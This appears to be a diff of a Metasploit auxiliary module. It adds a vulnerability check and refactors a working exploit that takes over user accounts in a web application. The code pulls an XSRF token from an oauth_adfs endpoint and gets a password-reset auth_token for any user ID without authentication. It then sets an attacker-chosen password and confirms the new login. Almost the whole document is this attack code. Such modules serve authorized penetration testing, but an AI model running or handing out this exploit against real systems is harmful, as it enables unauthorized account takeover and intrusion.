@@ -1,5 +1,6 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -39,61 +40,25 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def decode_url(encoded_string)
-    encoded_string.gsub(/%([0-9A-Fa-f]{2})/) do
-      [::Regexp.last_match(1).to_i(16)].pack('C')
-    end
-  end
-
-  def run
+  def check
     # 1) Request oauth_adfs to obtain XSRF-TOKEN and _lic_engine_session
     res = send_request_cgi(
       'method' => 'GET',
+      'keep_cookies' => true,
       'uri' => normalize_uri(target_uri.path, 'backend/settings/oauth_adfs'),
       'vars_get' => {
         'hostname' => Rex::Text.rand_text_alpha(6..10)
       }
     )
 
-    unless res
-      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
-    end
-    unless res.code == 200
-      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
-    end
+    fail_with(Failure::UnexpectedReply, 'Failed to get a 200 response from the server.') unless res&.code == 200
     print_good('Server reachable.')
 
-    # Extract XSRF-TOKEN value
-    raw_res = res.to_s
-    xsrf_token_regex = /XSRF-TOKEN=([^;]*)/
-    xsrf_token = xsrf_token_regex.match(raw_res)
-
-    unless xsrf_token
-      fail_with(Failure::UnexpectedReply, 'XSRF Token not found')
-    end
-
-    xsrf_token_value = xsrf_token[1]
-    unless xsrf_token_value && !xsrf_token_value.empty?
-      fail_with(Failure::UnexpectedReply, 'XSRF Token value is null or empty.')
-    end
+    xsrf_token_value = res.get_cookies.scan(/XSRF-TOKEN=([^;]*)/).flatten[0]
+    fail_with(Failure::UnexpectedReply, 'XSRF Token not found') unless xsrf_token_value
 
     decoded_xsrf_token = decode_url(xsrf_token_value)
     print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
-
-    # Extract _lic_engine_session value
-    lic_token_regex = /_lic_engine_session=([^;]*)/
-    lic_token = lic_token_regex.match(raw_res)
-
-    unless lic_token
-      fail_with(Failure::UnexpectedReply, '_lic_engine_session not found')
-    end
-
-    lic_token_value = lic_token[1]
-    unless lic_token_value && !lic_token_value.empty?
-      fail_with(Failure::UnexpectedReply, '_lic_engine_session value is null or empty.')
-    end
-
-    print_good("Retrieved _lic_engine_session: #{lic_token_value}")
 
     # 2) Request generate_code to retrieve auth_token
     payload = {
@@ -103,20 +68,15 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'ctype' => 'application/json',
+      'keep_cookies' => true,
       'headers' => {
-        'X-Xsrf-Token' => decoded_xsrf_token,
-        'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
+        'X-Xsrf-Token' => decoded_xsrf_token
       },
       'uri' => normalize_uri(target_uri.path, 'backend/reset_password/generate_code'),
       'data' => payload
     })
 
-    unless res
-      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
-    end
-    unless res.code == 200
-      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
-    end
+    fail_with(Failure::UnexpectedReply, 'Request /backend/reset_password/generate_code to retrieve auth_token did not return a 200 response') unless res&.code == 200
 
     json = res.get_json_document
     if json.key?('error_message')
@@ -139,21 +99,101 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'ctype' => 'application/json',
+      'keep_cookies' => true,
       'headers' => {
-        'X-Xsrf-Token' => decoded_xsrf_token,
-        'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
+        'X-Xsrf-Token' => decoded_xsrf_token
       },
       'uri' => normalize_uri(target_uri.path, 'backend/reset_password'),
       'data' => payload
     })
 
-    unless res
-      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
+    fail_with(Failure::UnexpectedReply, 'Password reset attempt failed') unless res&.code == 200
+
+    json = res.get_json_document
+    if json.key?('error')
+      return Exploit::CheckCode::Safe
+    elsif json.key?('status')
+      return Exploit::CheckCode::Appears
     end
 
-    unless res.code == 200
-      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
+    Exploit::CheckCode::Unknown
+  end
+
+  def decode_url(encoded_string)
+    encoded_string.gsub(/%([0-9A-Fa-f]{2})/) do
+      [::Regexp.last_match(1).to_i(16)].pack('C')
     end
+  end
+
+  def run
+    # 1) Request oauth_adfs to obtain XSRF-TOKEN and _lic_engine_session
+    res = send_request_cgi(
+      'method' => 'GET',
+      'keep_cookies' => true,
+      'uri' => normalize_uri(target_uri.path, 'backend/settings/oauth_adfs'),
+      'vars_get' => {
+        'hostname' => Rex::Text.rand_text_alpha(6..10)
+      }
+    )
+
+    fail_with(Failure::UnexpectedReply, 'Failed to get a 200 response from the server.') unless res&.code == 200
+    print_good('Server reachable.')
+
+    # Extract XSRF-TOKEN value
+    xsrf_token_value = res.get_cookies.scan(/XSRF-TOKEN=([^;]*)/).flatten[0]
+    fail_with(Failure::UnexpectedReply, 'XSRF Token not found') unless xsrf_token_value
+
+    decoded_xsrf_token = decode_url(xsrf_token_value)
+    print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
+
+    # 2) Request generate_code to retrieve auth_token
+    payload = {
+      uid: datastore['USER']
+    }.to_json
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'ctype' => 'application/json',
+      'keep_cookies' => true,
+      'headers' => {
+        'X-Xsrf-Token' => decoded_xsrf_token
+      },
+      'uri' => normalize_uri(target_uri.path, 'backend/reset_password/generate_code'),
+      'data' => payload
+    })
+
+    fail_with(Failure::UnexpectedReply, 'Request /backend/reset_password/generate_code to retrieve auth_token did not return a 200 response') unless res&.code == 200
+
+    json = res.get_json_document
+    if json.key?('error_message')
+      fail_with(Failure::UnexpectedReply, json['error_message'])
+    elsif json.key?('auth_token')
+      print_good('Retrieved auth_token: ' + json['auth_token'])
+    end
+
+    auth_token = json['auth_token']
+
+    # 3) Request reset_password to change the password of the specified user
+    payload = {
+      uid: datastore['USER'],
+      auth_token: auth_token,
+      password: datastore['NEW_PASSWORD'],
+      password_confirmation: datastore['NEW_PASSWORD'],
+      common_name: ''
+    }.to_json
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'ctype' => 'application/json',
+      'keep_cookies' => true,
+      'headers' => {
+        'X-Xsrf-Token' => decoded_xsrf_token
+      },
+      'uri' => normalize_uri(target_uri.path, 'backend/reset_password'),
+      'data' => payload
+    })
+
+    fail_with(Failure::UnexpectedReply, 'Password reset attempt failed') unless res&.code == 200
 
     json = res.get_json_document
     if json.key?('error_message')
@@ -169,18 +209,16 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'ctype' => 'application/json',
+      'keep_cookies' => true,
       'headers' => {
         'X-Xsrf-Token' => decoded_xsrf_token,
-        'Accept' => 'application/json',
-        'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
+        'Accept' => 'application/json'
       },
       'uri' => normalize_uri(target_uri.path, 'backend/auth/identity/callback'),
       'data' => payload
     })
 
-    unless res.code == 200
-      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
-    end
+    fail_with(Failure::UnexpectedReply, 'Failed to verify authentication with the new password was successful.') unless res&.code == 200
 
     json = res.get_json_document
     unless json.key?('uid') && json['uid'] == datastore['USER']
